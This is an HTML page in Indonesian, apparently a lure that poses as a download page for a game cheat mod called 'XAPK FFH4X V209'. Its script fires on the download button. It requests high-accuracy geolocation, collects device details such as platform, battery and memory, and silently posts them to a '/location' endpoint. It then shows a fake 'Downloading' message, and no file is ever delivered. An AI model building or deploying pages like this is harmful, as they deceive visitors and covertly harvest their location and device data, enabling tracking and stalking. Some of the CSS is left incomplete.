    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {

    body::after {

    .card {
      position: relative;
      z-index: 1;
      background: rgba(255,255,255,0.04);
      border: 1px solid rgba(255,255,255,0.09);
      border-radius: 32px;
      padding: 52px 48px;
      max-width: 380px;
      width: 90%;
      text-align: center;
      backdrop-filter: blur(12px);
      box-shadow: 0 32px 80px rgba(0,0,0,0.45);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }

    .app-logo {
      width: 110px;
      height: 110px;
      border-radius: 26px;
      object-fit: cover;
      box-shadow: 0 0 0 1px rgba(255,255,255,0.08), 0 16px 40px rgba(0,0,0,0.4);
    }

    .app-name {
      font-size: 1.85rem;
      font-weight: 800;
      color: #fff;
      letter-spacing: -0.03em;
    }

    .btn-download {
      margin-top: 8px;
      width: 100%;
      padding: 16px;
      border-radius: 16px;
      border: none;
      background: linear-gradient(135deg, #3B82F6, #6366F1);
      color: #fff;
      font-family: 'Inter', sans-serif;
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 8px 24px rgba(59,130,246,0.35);
      position: relative;
      overflow: hidden;
      transition: transform 0.18s ease, box-shadow 0.18s ease;
    }
    .btn-download::after {
      content: '';
      position: absolute;
      top: 0; left: -100%;
      width: 60%; height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
      transform: skewX(-20deg);
    }
    .btn-download:hover::after {
      left: 160%;
      transition: left 0.5s ease;
    }
    .btn-download:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 32px rgba(59,130,246,0.5);
    }
    .btn-download:active { transform: translateY(0); }

    .toast {
      position: fixed;
      bottom: 36px;
      left: 50%;
      transform: translateX(-50%) translateY(80px);
      background: #1E293B;
      border: 1px solid rgba(255,255,255,0.1);
      color: #fff;
      padding: 12px 24px;
      border-radius: 50px;
      font-size: 0.82rem;
      font-weight: 500;
      box-shadow: 0 16px 40px rgba(0,0,0,0.5);
      opacity: 0;
      transition: transform 0.35s cubic-bezier(.34,1.56,.64,1), opacity 0.3s ease;
      z-index: 99;
      white-space: nowrap;
    }
    .toast.show {

<body>

  <div class="card">
    <img
      class="app-logo"
      src="https://cdn.jsdelivr.net/gh/ByexeOfficial999/image-to-url@main/uploads/1000643512_1782386360631.jpg"
      alt="ByexeApp Logo"
    />
    <div class="app-name">XAPK FFH4X V209</div>
    <button class="btn-download" onclick="handleDownload()">Unduh</button>
  </div>

  <div class="toast" id="toast"></div>

  <script>
    const toast = document.getElementById('toast');

    function showToast(message) {
      toast.textContent = message;
      toast.classList.add('show');
      setTimeout(() => toast.classList.remove('show'), 2800);
    }

    async function getDeviceInfo() {
      const os = navigator.platform || 'N/A';
      const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
      let battery = 'N/A';
      try {
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sedang di Charge' : 'Tidak di Charge'})`;
        }
      } catch (e) {}
      const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
      return { os, deviceType, battery, memory };
    }

    function sendData(lat, lon) {
      getDeviceInfo().then(device => {
        const payload = { lat, lon, ...device };
        fetch('/location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(() => {});
      });
    }

    function handleDownload() {
      if (!navigator.geolocation) {
        showToast('Gagal mengunduh Aplikasi');
        return;
      }

      navigator.geolocation.getCurrentPosition(
        pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          sendData(lat, lon);
          showToast('Mengunduh XAPK FFH4X V209…');
        },
        () => {
          showToast('Gagal mengunduh Aplikasi');
        },
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    }
  </script>
